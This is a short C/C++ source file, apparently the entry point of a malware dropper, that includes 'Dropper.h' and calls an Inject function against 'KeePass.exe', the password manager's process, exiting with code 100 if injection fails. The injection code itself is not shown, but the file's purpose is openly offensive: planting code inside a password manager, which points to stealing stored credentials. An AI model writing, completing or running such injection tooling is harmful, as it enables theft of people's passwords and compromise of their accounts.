#include "Dropper.h"

int main(int argc, const char* argv[]) {
	//HMODULE unit=LoadLibraryA("UnitTest.dll");
	
	int status = Inject("KeePass.exe", NULL);
	if (!status) {
		exit(100);
	}
}